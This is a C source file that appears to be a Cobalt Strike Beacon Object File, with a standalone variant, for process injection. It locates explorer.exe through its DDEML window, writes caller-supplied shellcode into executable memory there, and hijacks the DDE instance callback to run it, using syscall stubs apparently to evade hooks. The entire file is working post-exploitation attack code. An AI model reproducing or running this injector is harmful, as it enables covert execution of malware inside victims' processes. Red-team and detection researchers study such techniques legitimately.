#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include "beacon.h"
#include "bofdefs.h"
#include "ntdefs.h"
#include "base.c"
#include "injection.c"

typedef struct tagLINK_COUNT *PLINK_COUNT;
typedef ATOM LATOM;

typedef struct tagSERVER_LOOKUP {
    LATOM           laService;
    LATOM           laTopic;
    HWND            hwndServer;
} SERVER_LOOKUP, *PSERVER_LOOKUP;

typedef struct tagCL_INSTANCE_INFO {
    struct tagCL_INSTANCE_INFO *next;
    HANDLE                      hInstServer;
    HANDLE                      hInstClient;
    DWORD                       MonitorFlags;
    HWND                        hwndMother;
    HWND                        hwndEvent;
    HWND                        hwndTimeout;
    DWORD                       afCmd;
    PFNCALLBACK                 pfnCallback;
    DWORD                       LastError;
    DWORD                       tid;
    LATOM                      *plaNameService;
    WORD                        cNameServiceAlloc;
    PSERVER_LOOKUP              aServerLookup;
    short                       cServerLookupAlloc;
    WORD                        ConvStartupState;
    WORD                        flags;              // IIF_ flags
    short                       cInDDEMLCallback;
    PLINK_COUNT                 pLinkCount;
} CL_INSTANCE_INFO, *PCL_INSTANCE_INFO;

#define GWLP_INSTANCE_INFO 0 // PCL_INSTANCE_INFO

DWORD dde(LPBYTE lpShellcodeBuffer, DWORD dwShellcodeBufferSize)
{
    DWORD  dwErrorCode = ERROR_SUCCESS;
    HWND hWnd = NULL;
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    PHMOD hNTDLL = NULL;
    NtAllocateVirtualMemory_t NtAllocateVirtualMemory = NULL;
    NtReadVirtualMemory_t NtReadVirtualMemory = NULL;
    NtWriteVirtualMemory_t NtWriteVirtualMemory = NULL;
    NtFreeVirtualMemory_t     NtFreeVirtualMemory = NULL;
    SIZE_T RegionSize = 0;
    LPVOID lpRemoteShellcodeBuffer = NULL;
    LPVOID lpInstanceInfo = NULL;
    CL_INSTANCE_INFO clInstanceInfo;
    CONVCONTEXT convContext;
    HCONVLIST convList;
    DWORD dwInstanceId = 0;
 
 /*
    internal_printf("lpShellcodeBuffer:     %p\n", lpShellcodeBuffer);
    internal_printf("dwShellcodeBufferSize: %lu\n", dwShellcodeBufferSize);
*/

    // Custom LoadLibrary on NTDLL
    hNTDLL = _LoadLibrary(NTDLL_PATH);
    if(NULL == hNTDLL) { goto end; }

    // Get the syscall addresses
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetSyscallStub(hNTDLL, "NtAllocateVirtualMemory");
    NtReadVirtualMemory = (NtReadVirtualMemory_t)GetSyscallStub(hNTDLL, "NtReadVirtualMemory");
    NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetSyscallStub(hNTDLL, "NtWriteVirtualMemory");
    NtFreeVirtualMemory = (NtFreeVirtualMemory_t)GetSyscallStub(hNTDLL, "NtFreeVirtualMemory");
    if ((NULL == NtAllocateVirtualMemory) || 
        (NULL == NtReadVirtualMemory) || 
        (NULL == NtWriteVirtualMemory) || 
        (NULL == NtFreeVirtualMemory)
    )
    {
        dwErrorCode = ERROR_PROC_NOT_FOUND;
        internal_printf("GetSyscallStub failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Get the handle to the target process's window
    hWnd = USER32$FindWindowExA(NULL, NULL, "DDEMLMom", NULL);
    if (NULL == hWnd)
    {
        dwErrorCode = ERROR_INVALID_WINDOW_HANDLE;
        internal_printf("Failed to find a DDEMLMom window handle\n");
        goto end;
    }

    // Get the process ID for explorer
    USER32$GetWindowThreadProcessId(hWnd, &dwProcessId);

    internal_printf("Injecting into explorer.exe with PID:%lu\n", dwProcessId);

    // Open explorer.exe
    hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL == hProcess)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("OpenProcess failed (%lu)\n", dwErrorCode);
        goto end;
    }

#ifdef _WIN64
    lpInstanceInfo = (LPVOID)USER32$GetWindowLongPtrA(hWnd, GWLP_INSTANCE_INFO);
#else
    lpInstanceInfo = (LPVOID)USER32$GetWindowLongA(hWnd, GWLP_INSTANCE_INFO);
#endif
    if (NULL == lpInstanceInfo)
    {
        dwErrorCode = KERNEL32$GetLastError();
        internal_printf("GetWindowLongPtrA failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Read in the clInstanceInfo from the remote process
    intZeroMemory(&clInstanceInfo, sizeof(clInstanceInfo));
    dwErrorCode = NtReadVirtualMemory(
        hProcess, 
        lpInstanceInfo, 
        &clInstanceInfo, 
        sizeof(clInstanceInfo), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtReadVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Allocate remote shellcode buffer
    RegionSize = dwShellcodeBufferSize + 1;
    dwErrorCode = NtAllocateVirtualMemory(
        hProcess, 
        &lpRemoteShellcodeBuffer, 
        0, 
        &RegionSize, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (STATUS_SUCCESS != dwErrorCode)
    {
        internal_printf("NtAllocateVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Write the shellcode to the remote buffer
    dwErrorCode = NtWriteVirtualMemory(
        hProcess, 
        lpRemoteShellcodeBuffer, 
        lpShellcodeBuffer, 
        dwShellcodeBufferSize, 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Update the clInstanceInfo callback
    dwErrorCode = NtWriteVirtualMemory(
        hProcess, 
        (PBYTE)lpInstanceInfo + offsetof(CL_INSTANCE_INFO, pfnCallback), 
        &lpRemoteShellcodeBuffer, 
        sizeof(LPVOID), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Trigger execution
    USER32$DdeInitializeA(&dwInstanceId, NULL, APPCLASS_STANDARD, 0);
    intZeroMemory(&convContext, sizeof(convContext));
    convContext.cb = sizeof(convContext);
    convList = USER32$DdeConnectList(dwInstanceId, 0, 0, 0, &convContext);
    USER32$DdeDisconnectList(convList);
    USER32$DdeUninitialize(dwInstanceId);

    // Restore the original kernel callback table
    dwErrorCode = NtWriteVirtualMemory(
        hProcess, 
        (PBYTE)lpInstanceInfo + offsetof(CL_INSTANCE_INFO, pfnCallback), 
        &clInstanceInfo.pfnCallback, 
        sizeof(LPVOID), 
        &RegionSize
    );
    if ( STATUS_SUCCESS != dwErrorCode )
    {
        internal_printf("NtWriteVirtualMemory failed (%lu)\n", dwErrorCode);
        goto end;
    }

end:
    // Free remote shellcode?
    /*
    if (lpRemoteShellcodeBuffer)
    {
        NtFreeVirtualMemory(
            hProcess, 
            lpRemoteShellcodeBuffer, 
            0, 
            MEM_RELEASE | MEM_DECOMMIT
        );
        lpRemoteShellcodeBuffer = NULL;
    }
    */

    if (hProcess)
    {
        KERNEL32$CloseHandle(hProcess);
        hProcess = NULL;
    }

    return dwErrorCode;
}


#ifdef BOF
VOID go( 
	IN PCHAR Buffer, 
	IN ULONG Length 
) 
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
	datap   parser;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;
    
    // Get the arguments <PID> <SHELLCODE>
	BeaconDataParse(&parser, Buffer, Length);
    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&parser, (int*)(&dwShellcodeBufferSize));
	
    if(!bofstart())
	{
		return;
	}

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__   
    internal_printf("dde( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = dde(
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "dde failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

	printoutput(TRUE);
};
#else
int main(int argc, const char* argv[])
{
    DWORD   dwErrorCode = ERROR_SUCCESS;
    LPBYTE  lpShellcodeBuffer = NULL;
    DWORD   dwShellcodeBufferSize = 0;

    // Check to see if we received any arguments
    if (2 != argc)
    {
        BeaconPrintf(CALLBACK_ERROR, "Invalid number of arguments\n");
        BeaconPrintf(CALLBACK_OUTPUT, "Usage: %s <SHELLCODE>\n", argv[0]);
        goto end;
    }

    dwErrorCode = ReadFileIntoBuffer(argv[1], &lpShellcodeBuffer, &dwShellcodeBufferSize);
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ReadFileIntoBuffer failed (%lu)\n", dwErrorCode);
        goto end;
    }

    // Execute our shellcode into the injection process
#ifndef __clang_analyzer__       
    internal_printf("dde( %02x %02x %02x %02x ..., %lu )\n", 
        lpShellcodeBuffer[0], lpShellcodeBuffer[1], lpShellcodeBuffer[2], lpShellcodeBuffer[3],
        dwShellcodeBufferSize
    );
#endif    
    dwErrorCode = dde(
        lpShellcodeBuffer, 
        dwShellcodeBufferSize
    );
    if (ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "dde failed (%lu)\n", dwErrorCode);
		goto end;
    }

    internal_printf("SUCCESS.\n");

end:

    if(lpShellcodeBuffer)
    {
        intFree(lpShellcodeBuffer);
        lpShellcodeBuffer = NULL;
    }

    return dwErrorCode;
}
#endif
